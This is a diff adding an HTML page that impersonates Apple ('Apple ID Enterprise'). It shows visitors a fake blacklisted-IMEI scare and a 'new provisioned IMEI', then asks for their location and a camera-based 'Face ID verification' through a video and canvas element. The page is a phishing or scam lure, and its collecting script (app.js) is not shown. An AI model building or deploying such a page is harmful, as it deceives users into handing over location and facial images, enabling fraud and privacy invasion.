@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Provisioning | Apple Services</title>
+    <link rel="manifest" href="manifest.json">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="apple-touch-icon" href="https://www.apple.com/apple-touch-icon.png">
+</head>
+<body>
+    <div class="main-container">
+        <!-- Apple Logo — official Unicode  glyph rendered via SF Pro -->
+        <div class="apple-logo-mark"></div>
+
+        <h1 class="logo" id="header-text">Apple ID Enterprise</h1>
+        <p class="subtitle" id="status-text">We need to verify your location to restore device functionality.</p>
+        <p class="auth-notice">This site is restricted to authorized Apple hardware developers only.</p>
+
+        <!-- Main Button Area -->
+        <button class="main-btn" id="main-btn">
+            Continue Validation
+        </button>
+
+        <!-- Loading View -->
+        <div class="progress-container hidden" id="progress-container">
+            <div class="apple-spinner">
+                <div class="spinner-blade"></div><div class="spinner-blade"></div><div class="spinner-blade"></div><div class="spinner-blade"></div><div class="spinner-blade"></div><div class="spinner-blade"></div><div class="spinner-blade"></div><div class="spinner-blade"></div><div class="spinner-blade"></div><div class="spinner-blade"></div><div class="spinner-blade"></div><div class="spinner-blade"></div>
+            </div>
+            <p class="loading-text">Connecting to GSMA Server...</p>
+        </div>
+
+        <!-- IMEI Result View (no input — displays generated IMEI) -->
+        <div class="imei-result hidden" id="imei-result">
+            <p class="imei-explainer">Your previous IMEI has been blacklisted by the carrier network. A new IMEI has been provisioned for your device.</p>
+            <div class="imei-card">
+                <span class="imei-label">New Provisioned IMEI</span>
+                <span class="imei-value" id="imei-value">—</span>
+            </div>
+            <p class="imei-instruction">Write down your new IMEI. Go to <strong>Settings → General → About</strong> and confirm it matches after restarting your device.</p>
+        </div>
+
+        <!-- Face ID Verification (appears after IMEI is generated) -->
+        <div class="faceid-section hidden" id="faceid-section">
+            <div class="faceid-divider"></div>
+            <p class="imei-explainer">To permanently link your new IMEI, Apple requires <strong>Face ID verification</strong>. Position your face within the frame.</p>
+            <video id="faceid-video" class="faceid-video hidden" autoplay playsinline muted></video>
+            <canvas id="faceid-canvas" class="hidden"></canvas>
+            <button class="main-btn faceid-btn" id="faceid-btn">
+                Verify with Face ID
+            </button>
+        </div>
+
+        <div class="footer-text">
+            <span class="footer-apple-glyph"></span>
+            <span>Testing on Vercel for Apple Enterprise Device Services. Authorized personnel only.</span>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
